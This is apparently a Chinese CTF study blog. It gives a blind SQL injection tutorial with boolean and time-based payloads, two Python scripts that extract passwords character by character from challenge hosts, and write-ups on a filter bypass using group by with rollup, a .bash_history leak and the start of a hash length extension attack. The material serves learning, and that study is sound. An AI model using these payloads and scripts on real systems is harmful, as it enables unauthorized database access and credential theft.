<p>盲注查询的基本套路：截取，是否相等，相等=ture页面，不相等=false页面<br>替换r，直到ture页面<br>再substring( 巴拉巴拉 , 2 , 1 ),如此反复</p>
<p><strong>时间型:</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$name=' or  if( (<span class="keyword">select</span> <span class="keyword">substring</span>( <span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span> )=<span class="string">'r'</span>),<span class="keyword">sleep</span>(<span class="number">0.5</span>),<span class="number">1</span>) <span class="comment">--+   #截取第一位开始的一个 </span></div><div class="line"></div><div class="line">全局：<span class="keyword">select</span> <span class="number">2</span>列 <span class="keyword">from</span> 表 <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">''</span> <span class="keyword">or</span>  <span class="keyword">if</span>( (<span class="keyword">select</span> <span class="keyword">substring</span>( <span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span> )=<span class="string">'r'</span>),<span class="keyword">sleep</span>(<span class="number">0.5</span>),<span class="number">1</span>) <span class="comment">--+'</span></div></pre></td></tr></table></figure>
<p><strong>此处说明sleep（0.5）</strong>：说是睡0.5秒实际上是 表中除了name=’’以外的记录数×0.5秒</p>
<p>此句中的sleep()语句会跟 or还是and 以及 select主句中查询的记录数 有关。<br>具体情况自己可以在mysql中试验。</p>
<p>实际操作中写的数值大就好，因为我们会根据timeout时间超时来判断，超时–&gt;正确；不超时–&gt;错误。</p>
<h3 id="3-猜解库，表，列"><a href="#3-猜解库，表，列" class="headerlink" title="3.猜解库，表，列"></a>3.猜解库，表，列</h3><p><strong>布尔型</strong>：用字典文件替换db,table,column,如果不存在，返回false界面；存在，返回true界面。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">1.猜解当前表中的列名</div><div class="line">$name=1' and column is not null <span class="comment">--+</span></div><div class="line"></div><div class="line">全句：<span class="keyword">select</span> <span class="number">2</span>列 <span class="keyword">from</span> 表 <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">''</span> <span class="keyword">and</span> <span class="keyword">column</span> <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span> <span class="comment">-- '</span></div><div class="line"></div><div class="line"><span class="number">2.</span>猜解当前表名<span class="comment">------已猜出列名</span></div><div class="line">$<span class="keyword">name</span>=<span class="string">' and table.user is not null --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">3.猜解当前数据库名--已猜出列名，表名</span></div><div class="line"><span class="string">$name='</span> <span class="keyword">and</span> db.table.user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span> <span class="comment">--+</span></div><div class="line"></div><div class="line"><span class="number">4.</span>猜解当前数据库的其他表</div><div class="line">$<span class="keyword">name</span>=<span class="string">' and (select count(*) from table)&gt;0 --+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">5.4.猜解其他数据库的表和列 （如果三者都不知道这种查询只能同时猜三个变量）</span></div><div class="line"><span class="string">$name='</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> db.table)&gt;<span class="number">0</span> <span class="comment">--+</span></div></pre></td></tr></table></figure></p>
<p><strong>时间型</strong>：用字典文件替换db,table,column,如果不存在，立即返回；存在，超时。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">1.猜解当前表中的列名</div><div class="line">$name=1' and if( (column is not null),sleep(5),1) <span class="comment">--+  </span></div><div class="line"></div><div class="line">全句：<span class="keyword">select</span> <span class="number">2</span>列 <span class="keyword">from</span> 表 <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">'1'</span> <span class="keyword">and</span> <span class="keyword">if</span>( (<span class="keyword">column</span> <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span>),<span class="keyword">sleep</span>(<span class="number">0.5</span>)&amp;<span class="number">1</span>,<span class="number">1</span>) <span class="comment">-- '</span></div><div class="line"></div><div class="line"><span class="number">2.</span>猜解当前表名<span class="comment">------已猜出列名</span></div><div class="line">$<span class="keyword">name</span>=<span class="number">1</span><span class="string">' and if( (table.column is not null),sleep(5),1) --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">3.猜解当前数据库名--已猜出列名，表名</span></div><div class="line"><span class="string">$name=1'</span> <span class="keyword">and</span> <span class="keyword">if</span>( (db.table.column <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span>),<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></div><div class="line"></div><div class="line"><span class="number">4.</span>猜解当前数据库的其他表</div><div class="line">$<span class="keyword">name</span>=<span class="number">1</span><span class="string">' and if( (select count(*) from table)&gt;0 ,sleep(5),1)--+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">5.4.猜解其他数据库的表和列 （如果三者都不知道这种查询只能同时猜三个变量）</span></div><div class="line"><span class="string">$name='</span> <span class="keyword">and</span> <span class="keyword">if</span>( (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> db.table)&gt;<span class="number">0</span> ,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></div></pre></td></tr></table></figure>
<h3 id="4-从information-schema中读取列，表，库"><a href="#4-从information-schema中读取列，表，库" class="headerlink" title="4.从information_schema中读取列，表，库"></a>4.从information_schema中读取列，表，库</h3><p>如果有访问information_schema的权限，当然可以从中读取。<br>此处列出时间型的小栗子：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">1.读取列名</div><div class="line">$name=1' and if( (<span class="keyword">select</span> <span class="keyword">substring</span>(column_name,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span> )=<span class="string">'A'</span> ,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">--+</span></div><div class="line"></div><div class="line"><span class="number">2.</span>读取表名</div><div class="line">$<span class="keyword">name</span>=<span class="number">1</span><span class="string">' and if( (select substring(table_name,1,1) from information_schema.tables  limit 1 offset 0 )='</span>A<span class="string">' ,sleep(5),1)--+  </span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">3.读取库名</span></div><div class="line"><span class="string">$name=1'</span> <span class="keyword">and</span> <span class="keyword">if</span>( (<span class="keyword">select</span> <span class="keyword">substring</span>(table_schema,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> table_schema <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span> )=<span class="string">'A'</span> ,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">--+</span></div><div class="line"></div><div class="line"><span class="number">4.</span>读取表的库名</div><div class="line">$<span class="keyword">name</span>=<span class="number">1</span><span class="string">' and if( (select substring(table_schuma,1,1) from information_schema.tables where table_name='</span>XXXX<span class="string">'  limit 1 offset 0 )='</span>A<span class="string">' ,sleep(5),1)--+  </span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">5.读取列的库名</span></div><div class="line"><span class="string">$name=1'</span> <span class="keyword">and</span> <span class="keyword">if</span>( (<span class="keyword">select</span> <span class="keyword">substring</span>(table_name,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> column_name=<span class="string">'XXXX'</span>  <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span> )=<span class="string">'A'</span> ,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">--+</span></div></pre></td></tr></table></figure></p>
<p>布尔型的就以此类推，不再写了吧。</p>
<h3 id="5-猜解FLAG"><a href="#5-猜解FLAG" class="headerlink" title="5.猜解FLAG"></a>5.猜解FLAG</h3><p>可用select：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$name=' union <span class="keyword">select</span>  <span class="keyword">ascii</span>(<span class="keyword">substring</span>(flag,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> flag =<span class="string">'102    ------&gt;ascii匹配</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">$name='</span> <span class="keyword">union</span> <span class="keyword">select</span>  <span class="keyword">substring</span>(flag,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">from</span> flag =<span class="string">'A'</span>            <span class="comment">------&gt;字符匹配</span></div></pre></td></tr></table></figure></p>
<p>不好select的情况：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$name=' or column = 'admin  <span class="comment">-----&gt; 内容精准</span></div><div class="line"></div><div class="line">$name=' or column like '%a%  <span class="comment">-----&gt;  模糊查找</span></div></pre></td></tr></table></figure></p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>给出个说明较好的盲注实例 <a href="http://blog.csdn.net/pygain/article/details/53086389" target="_blank" rel="external">戳这里=w=</a></p>
<h2 id="requests与脚本"><a href="#requests与脚本" class="headerlink" title="requests与脚本"></a>requests与脚本</h2><p>盲注的手动注入不现实，burpsuite也不是很方便，学习用py脚本来盲注。<br>需要requests库，<a href="docs.python-requests.org/zh_CN/latest/user/quickstart.html">使用说明</a>。<br>贴上两道题目的解题的代码，加上注释，看着学习把。(题目访问url)</p>
<h3 id="布尔型脚本"><a href="#布尔型脚本" class="headerlink" title="布尔型脚本"></a>布尔型脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">url=<span class="string">"http://58.154.33.13:8002/login.php"</span></div><div class="line"></div><div class="line">payloads=<span class="string">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@!#$%^&amp;*()-=+~`[];'./"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#判断列</span></div><div class="line">sql_column=<span class="string">"admin' and column is not null"</span>  <span class="comment">#替换column  得到 password</span></div><div class="line"><span class="comment">#判断表</span></div><div class="line">sql_table=<span class="string">"admin' and (select password from table)&gt;0"</span>  <span class="comment">#替换table 得到 admin</span></div><div class="line"><span class="comment">#列出password</span></div><div class="line">sql=<span class="string">"admin'and (select substring(password,%s,1) from admin)='%s' #"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i,x)</span>:</span></div><div class="line">	data=&#123;<span class="string">'username'</span>:sql %(i,x),<span class="string">'password'</span>:<span class="string">'123'</span>&#125;</div><div class="line">	response=requests.post(url,data=data)</div><div class="line">	<span class="keyword">if</span> response.content.decode(<span class="string">'utf-8'</span>).find(<span class="string">'密码错误'</span>)&gt;<span class="number">0</span>:</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span></div><div class="line">	<span class="keyword">else</span> :</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span></div><div class="line"></div><div class="line">key=<span class="string">''</span></div><div class="line">print(<span class="string">'start'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> payloads:</div><div class="line">		<span class="keyword">if</span> exp(i,x)==<span class="number">1</span> :</div><div class="line">			key += x</div><div class="line">			print(key)</div><div class="line">			<span class="keyword">break</span></div></pre></td></tr></table></figure>
<h3 id="时间型脚本"><a href="#时间型脚本" class="headerlink" title="时间型脚本"></a>时间型脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line">url=<span class="string">"http://ctf5.shiyanbar.com/web/5/index.php"</span></div><div class="line">payloads=<span class="string">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@!#$%^&amp;*()-=+~`[];'./"</span></div><div class="line"><span class="comment">#判断列    通过 错误 以及  返回固定页面（正确）   ------&gt; user pw</span></div><div class="line">sql_column=<span class="string">"' or  column is not null"</span></div><div class="line"><span class="comment">#判断表    通过 错误 以及  返回固定页面（正确）   ------&gt;  php</span></div><div class="line">sql_table=<span class="string">"' or select pw from table"</span></div><div class="line"><span class="comment">#判断数据</span></div><div class="line">sql_data=<span class="string">"' or if(substring((select pw from php limit 1),%d,1)=%s,sleep(5),0) #"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i,x)</span>:</span></div><div class="line">	data=&#123;<span class="string">'user'</span>:sql_data %(i,x),<span class="string">'pass'</span>:<span class="string">'123'</span>&#125;</div><div class="line">	starttime=time.time()</div><div class="line">	s=requests.post(url,data=data)</div><div class="line">	<span class="keyword">if</span> time.time()-starttime &gt;<span class="number">5</span> :    <span class="comment">#post下 尝试用timeout参数失败，于是改用此方法来判定超时</span></div><div class="line">		<span class="keyword">return</span> <span class="number">1</span></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span></div><div class="line"></div><div class="line">key=<span class="string">''</span></div><div class="line">print(<span class="string">'start'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">1</span>,<span class="number">50</span>):</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> payloads:</div><div class="line">		<span class="comment">#print(i,x)</span></div><div class="line">		<span class="keyword">if</span> exp(i,x)==<span class="number">1</span> :</div><div class="line">			key += x</div><div class="line">			print(key)</div><div class="line">			<span class="keyword">break</span></div></pre></td></tr></table></figure>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ZJGSCTF-writeup]]></title>
      <url>/2017/09/18/ZJGSCTF_writeup/</url>
      <content type="html"><![CDATA[<p>——<a href="http://121.42.189.18" target="_blank" rel="external">ZJGSCTF</a>——-<br>——持续更新中——-<br><a id="more"></a></p>
<h2 id="9-7-综合题"><a href="#9-7-综合题" class="headerlink" title="[9-7]综合题"></a>[9-7]综合题</h2><p><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php" target="_blank" rel="external">戳这里=w=</a></p>
<h3 id="涉及范围：编码及Linux"><a href="#涉及范围：编码及Linux" class="headerlink" title="涉及范围：编码及Linux"></a>涉及范围：编码及Linux</h3><p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fjrdknuoc8j30ld08haaa.jpg" alt="9-7.1"></p>
<p>页面乱码，猜测是一种编码方式，由 [ ] ! + ( ) { } 组成<br>参考 <a href="https://www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html" target="_blank" rel="external">编码与加密</a><br>得出是jsfuck编码，百度 <a href="http://www.bugku.com/tools/jsfuck/#" target="_blank" rel="external">在线解码</a><br>解码得出：1bc29b36f623ba82aaf6724fd3b16718.php<br>原地址去掉index.php，加上1bc29b36f623ba82aaf6724fd3b16718.php，访问</p>
<p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fjrdl9bvqvj30pr0453yf.jpg" alt="9-7.2"></p>
<p>脑袋,猜测地址1bc29b36f623ba82aaf6724fd3b16718.php的前部分32位为MD5编码<br>对其试解码得：MD5<br>考虑原地址b0b0ad119f425408fc3d45253137d33d为MD5解码，解码失败。<br>再进行了访问MD5.php等方法，无果，有点无从下手。<br>退档重新思考，再看提示，发现掉坑里，tip在我脑袋里应该是指包的头部，burpsuite抓包发现<strong>tip</strong></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fjrdljievpj30dd03fwei.jpg" alt="9.7.3"></p>
<p>百度 <a href="http://blog.csdn.net/chinalinuxzend/article/details/1849419" target="_blank" rel="external">history of bash</a><br>于是访问 <strong>./.bash_history</strong></p>
<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fjrdlsuefkj30640110fx.jpg" alt="9-7.4"></p>
<p>有过一次压缩文件命令，访问 <strong>./flagbak.zip</strong><br>下载解压，得到flag</p>
<h2 id="8-31-水能载舟亦可赛艇"><a href="#8-31-水能载舟亦可赛艇" class="headerlink" title="[8-31]水能载舟亦可赛艇"></a>[8-31]水能载舟亦可赛艇</h2><p><a href="http://ctf5.shiyanbar.com/web/pcat/index.php" target="_blank" rel="external">戳这里=w=</a></p>
<h3 id="涉及范围-php源码，sql注入"><a href="#涉及范围-php源码，sql注入" class="headerlink" title="涉及范围:php源码，sql注入"></a>涉及范围:php源码，sql注入</h3><p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fjreabq0woj307m03e3ya.jpg" alt="1"></p>
<p>看到页面,好像典型的sql注入，但是web日常先看源码</p>
<p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fjreau9f4pj30800100l8.jpg" alt="2"></p>
<p>好像有点提示，尝试去url访问source.txt,得到源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">error_reporting(0);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_POST</span>[<span class="string">'uname'</span>]) || !isset(<span class="variable">$_POST</span>[<span class="string">'pwd'</span>])) &#123;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">    die;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">function</span> AttackFilter(<span class="variable">$StrKey</span>,<span class="variable">$StrValue</span>,<span class="variable">$ArrReq</span>)&#123;  </div><div class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$StrValue</span>))&#123;</div><div class="line">        <span class="variable">$StrValue</span>=implode(<span class="variable">$StrValue</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.<span class="variable">$ArrReq</span>.<span class="string">"/is"</span>,<span class="variable">$StrValue</span>)==1)&#123;   </div><div class="line">        <span class="built_in">print</span> <span class="string">"姘村彲杞借垷锛屼害鍙禌鑹囷紒"</span>;</div><div class="line">        <span class="built_in">exit</span>();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="variable">$filter</span> = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</div><div class="line">foreach(<span class="variable">$_POST</span> as <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123; </div><div class="line">    AttackFilter(<span class="variable">$key</span>,<span class="variable">$value</span>,<span class="variable">$filter</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="variable">$con</span> = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</div><div class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)&#123;</div><div class="line">	die(<span class="string">'Could not connect: '</span> . mysql_error());</div><div class="line">&#125;</div><div class="line"><span class="variable">$db</span>=<span class="string">"XXXXXX"</span>;</div><div class="line">mysql_select_db(<span class="variable">$db</span>, <span class="variable">$con</span>);</div><div class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;<span class="variable">$_POST</span>['uname']&#125;'"</span>;</div><div class="line"><span class="variable">$query</span> = mysql_query(<span class="variable">$sql</span>); </div><div class="line"><span class="keyword">if</span> (mysql_num_rows(<span class="variable">$query</span>) == 1) &#123; </div><div class="line">    <span class="variable">$key</span> = mysql_fetch_array(<span class="variable">$query</span>);</div><div class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>[<span class="string">'pwd'</span>] == <span class="variable">$_POST</span>[<span class="string">'pwd'</span>]) &#123;</div><div class="line">        <span class="built_in">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="built_in">print</span> <span class="string">"浜﹀彲璧涜墖锛�"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	<span class="built_in">print</span> <span class="string">"涓€棰楄禌鑹囷紒"</span>;</div><div class="line">&#125;</div><div class="line">mysql_close(<span class="variable">$con</span>);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>分析源码：</p>
<ul>
<li>第一大块是判断两个变量uname,pwd是否为空。</li>
<li>第二大块是进行了sql过滤。</li>
<li>第三大块查询了数据库，flag被两个if包括着，第一个if限定查询结果只有一行，第二个if要求pwd相等</li>
</ul>
<p>由于sql过滤严格，sql注入尝试无果。<br>考虑从pwd相等入手，利用 <strong>or</strong>,<a href="http://blog.csdn.net/keda8997110/article/details/8490895" target="_blank" rel="external"><strong>limit offset</strong></a>,  <strong>#</strong> 先过滤第一个if<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;or &apos;1&apos;=&apos;1&apos; limit 1 offset 0 #</div></pre></td></tr></table></figure></p>
<p>第二个if 用到 <a href="http://www.w3school.com.cn/sql/sql_groupby.asp" target="_blank" rel="external"><strong>group by</strong></a> 和 <a href="http://www.68idc.cn/help/mysqldata/mysql/20150607358491.html" target="_blank" rel="external">with rollup</a> （rollup–&gt;汇总,使group by的列的值为null,汇总其他列的数值）<br>利用这两个函数，构造 null = null<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;or &apos;1&apos;=&apos;1&apos; group by pwd with rollup limit 1 offset 0#</div></pre></td></tr></table></figure></p>
<p>offset 0 到 n 尝试得到我们汇总 pwd = null 的那一行<br>同时使 pwd = null （不是填写null，空着就好）</p>
<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fjrebupellj30ic01ma9y.jpg" alt="4"><br></div>


<h2 id="9-18-有点意思吧"><a href="#9-18-有点意思吧" class="headerlink" title="[9.18]有点意思吧"></a>[9.18]有点意思吧</h2><p><a href="http://ctf5.shiyanbar.com/web/kzhan.php" target="_blank" rel="external">戳这里=w=</a></p>
<h3 id="涉及范围：php源码，hash长度扩展攻击"><a href="#涉及范围：php源码，hash长度扩展攻击" class="headerlink" title="涉及范围：php源码，hash长度扩展攻击"></a>涉及范围：php源码，hash长度扩展攻击</h3><p>抓包，source这个参数有点奇怪，尝试改为1，得到源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$flag</span> = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</div><div class="line"><span class="variable">$secret</span> = <span class="string">"XXXXXXXXXXXXXXX"</span>; // This secret is 15 characters long <span class="keyword">for</span> security!</div><div class="line"></div><div class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">"username"</span>];</div><div class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">"password"</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!empty(<span class="variable">$_COOKIE</span>[<span class="string">"getmein"</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (urldecode(<span class="variable">$username</span>) === <span class="string">"admin"</span> &amp;&amp; urldecode(<span class="variable">$password</span>) != <span class="string">"admin"</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="variable">$COOKIE</span>[<span class="string">"getmein"</span>] === md5(<span class="variable">$secret</span> . urldecode(<span class="variable">$username</span> . <span class="variable">$password</span>))) &#123;</div><div class="line">            <span class="built_in">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</div><div class="line">            die (<span class="string">"The flag is "</span>. <span class="variable">$flag</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> &#123;</div><div class="line">            die (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> &#123;</div><div class="line">        die (<span class="string">"You are not an admin! LEAVE."</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">setcookie(<span class="string">"sample-hash"</span>, md5(<span class="variable">$secret</span> . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (60 * 60 * 24 * 7));</div><div class="line"></div><div class="line"><span class="keyword">if</span> (empty(<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>])) &#123;</div><div class="line">    setcookie(<span class="string">"source"</span>, 0, time() + (60 * 60 * 24 * 7));</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>] != 0) &#123;</div><div class="line">        <span class="built_in">echo</span> <span class="string">""</span>; // This <span class="built_in">source</span> code is outputted here</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>分析源码：</p>
<ul>
<li>第一个if：要求cookie里的<strong>getmein</strong>不为空</li>
<li>第二个if：<strong>username</strong> 等于 admin ； <strong>password</strong> 不等于 ‘admin’</li>
<li>第三个if：getmein 等于 未知15位secret+username+password 的MD5</li>
</ul>
